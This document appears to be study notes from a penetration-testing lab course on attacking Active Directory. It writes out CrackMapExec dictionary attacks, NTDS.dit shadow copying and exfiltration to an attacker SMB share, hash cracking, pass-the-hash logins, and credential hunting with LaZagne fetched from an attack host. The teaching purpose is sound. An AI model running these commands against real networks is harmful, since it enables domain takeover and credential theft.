### Windows Local Password Attacks 2

### Attacking Active Directory & NTDS.dit

```
# Active Directory (AD) is a common and critical directory service in modern enterprise networks. 
# AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack 
# & defend these AD environments. 
# It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. 
# Attacking AD is such an extensive & significant topic that we have multiple modules covering AD.
```

```
# In this section, we will focus primarily on how we can extract credentials 
# through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.
```

```
# There are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) 
# or other protocols used for remote access on their edge router to a system on their internal network. 
# Please know that most methods covered in this module simulate the steps after an initial compromise, 
# and a foothold is established on an internal network. 
```

```
# Once a Windows system is joined to a domain, it will no longer default 
# to referencing the SAM database to validate logon requests.
# That domain-joined system will now send all authentication requests to be validated 
# by the domain controller before allowing a user to log on. 
# This does not mean the SAM database can no longer be used. 
```

```
# Someone looking to log on using a local account in the SAM database can still do so 
# by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) 
# or with direct access to the device then typing ./ at the logon UI in the Username field. 

# Keep in mind that we can also study NTDS attacks by keeping track of this technique.
```

### Dictionary Attacks against AD accounts using CrackMapExec

```
# Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &/or password 
# using a customized list of potential usernames and passwords. 
# It can be rather noisy (easy to detect) to conduct these attacks over a network 
# because they can generate a lot of network traffic and alerts on the target system 
# as well as eventually get denied due to login attempt restrictions that may be applied through the use of Group Policy.
```

```
# Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:
Username Convention                   Practical Example for Jane Jill Doe
firstinitiallastname                  jdoe
firstinitialmiddleinitiallastname     jjdoe
firstnamelastname                     janedoe
firstname.lastname                    jane.doe
lastname.firstname                    doe.jane
nickname                              doedoehacksstuff


# Often, an email address's structure will give us the employee's username (structure: username@domain). 
# For example, from the email address jdoe@inlanefreight.com, we see that jdoe is the username.
```

```
# We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. 
# From there, we can use a script to scrape various social media sites and mashup potential valid usernames. 
# Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” 
# and find some valid usernames in the PDF properties if they were generated using a graphics editor. 
```

```
# We can create a custom list on our attack host using the names above. 
Attacking Active Directory & NTDS.dit

obs1rv1r@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim

# Of course, this is just an example and doesn't include all of the names, b
# ut notice how we can include a different naming convention for each name 
# if we do not already know the naming convention used by the target organization.
```

[Username Anarchy](https://github.com/urbanadventurer/username-anarchy)

```
# We can manually create our list(s) or use an automated list generator such as 
# the Ruby-based tool Username Anarchy to convert a list of real names into common username formats. 

git clone https://github.com/urbanadventurer/username-anarchy && cd username-anarchy     # Clone tool
./username-anarchy -i /home/user/usernames.txt                                           # Run tool against created list


# Using automated tools can save us time when crafting lists.
# It is ideal to limit the need to guess as much as possible when conducting password attacks.
```

### Launching the Attack with CrackMapExec

```
# Once we have our list(s) prepared or discover the naming convention and some employee names, 
# we can launch our attack against the target domain controller using a tool such as CrackMapExec.

# Run tool against smb with known user and pass list
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt      

# Once we have discovered some credentials, we could proceed to try to gain remote access 
# to the target domain controller and capture the NTDS.dit file.
```  

### Capturing NTDS.dit

[directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html)

```
# NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. 
# Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest.

# The .dit stands for directory information tree. 
# This is the primary database file associated with AD and stores all domain usernames, password hashes, 
# and other critical schema information. 
# If this file can be captured, we could potentially compromise every account on the domain 
# similar to the technique we covered in this module's Attacking SAM section.
```

### Connecting to a DC with Evil-WinRM

```
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'     # Connect to a target DC using the credentials we captured.

# Evil-WinRM connects to a target using the Windows Remote Management service combined with the 
# PowerShell Remoting Protocol to establish a PowerShell session with the target.

# Once connected, we can check to see what privileges bwilliamson has. 
# We can start with looking at the local group membership using the command:

*Evil-WinRM* PS C:\> net localgroup
output:
Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
...

*Evil-WinRM* PS C:\> net user bwilliamson
output:
User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
...
Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.

# This account has both Administrators and Domain Administrator rights which means 
# we can do just about anything we want, including making a copy of the NTDS.dit file.
```

### Creating Shadow Copy of C:

[Volume Shadow Copy (VSS)](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)

```
# We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume 
# the admin chose when initially installing AD. 
# It is very likely that NTDS will be stored on C: as that is the default location selected at install, 
# but it is possible to change the location.
# VSS is used by many different backup & disaster recovery software to perform operations.

*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
output:
Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location 
# on the drive to prepare to move NTDS.dit to our attack host.

*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
output:
1 file(s) copied.

# Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier 
# to create an SMB share on our attack host.

*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
output:
1 file(s) moved.
```

### A Faster Method: Using cme to Capture NTDS.dit

```
# Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command.(!)
# This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file 
# conveniently within our terminal session.

crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds                           # Run tool and grab Admin NTLM hash
```

### Cracking Hashes & Gaining Credentials

```
# We can proceed with creating a text file containing all the NT hashes, 
# or we can individually copy & paste a specific hash into a terminal session 
# and use Hashcat to attempt to crack the hash and a password in cleartext.

sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt      # hashcart against Admin NTLM hash
output:
64f12cddaa88057e06a81b54e73b949b:Password1

# In many of the techniques we have covered so far, we have had success in cracking hashes we've obtained.
```

### What if we are unsuccessful in cracking a hash?

### Pass-the-Hash Considerations

[NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials)

```
# We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). 
# A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. 
# Instead of username:clear-text password as the format for login, we can instead use username:password hash. 
# Here is an example of how this would work:

evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"

# We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.
```

### Credential Hunting in Windows

```
# Credential Hunting is the process of performing detailed searches across the file system 
# and through various applications to discover credentials. 
# To understand this concept, let's place ourselves in a scenario. 
# We have gained access to an IT admin's Windows 10 workstation through RDP.
```

```
# What might an IT admin be doing on a day-to-day basis & which of those tasks may require credentials?
# We can use this question & consideration to refine our search to reduce the need for random guessing as much as possible.
```

```
# Key Terms to Search
Passwords       Passphrases 	Keys
Username        User account 	Creds
Users           Passkeys        Passphrases
configuration 	dbcredential 	dbpassword
pwd             Login           Credentials
```

### Search Tools

```
# With access to the GUI, it is worth attempting to use Windows Search 
# to find files on the target using some of the keywords mentioned above.
```

### Lazagne

[Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)

```
# We can also take advantage of third-party tools like Lazagne to quickly discover credentials 
# that web browsers or other installed applications may insecurely store.
# We can use our RDP client to copy the file over to the target from our attack host. 
# If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.


C:\Users\bob\Desktop> start lazagne.exe all               # Run tool
output:
[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

### findstr

[findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)

```
# We can also use findstr to search from patterns across many types of files. 
# Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

### Additional Considerations

```
# Here are some other places we should keep in mind when credential hunting:

Passwords in Group Policy in the SYSVOL share
Passwords in scripts in the SYSVOL share
Password in scripts on IT shares
Passwords in web.config files on dev machines and IT shares
unattend.xml
Passwords in the AD user or computer description fields
KeePass databases --> pull hash, crack and get loads of access.
Found on user systems and shares
Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
```

```
# Task Solution

# I search in win bar for “pass” and foundnd file “passwords.ods”

# I search in win bar "gitlab" and founnd a file "GitLab.."

# Download the LaZagne.exe from pentesthost through the python http server
python3 -m http.server 9000                          # on pentest host
curl http://10.x.x.x/lazagne.exe -o lazagne.exe      # on target win host, then run it

# Use findstr for text strings search inside files:
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
# Found and open file: Automations&Scripts\BulkaddADusers.ps1 and default pass inside.

# Find ansible script with edge router config with user pass inside by path:
C:\Automations&Scripts\AnsibleScripts
```
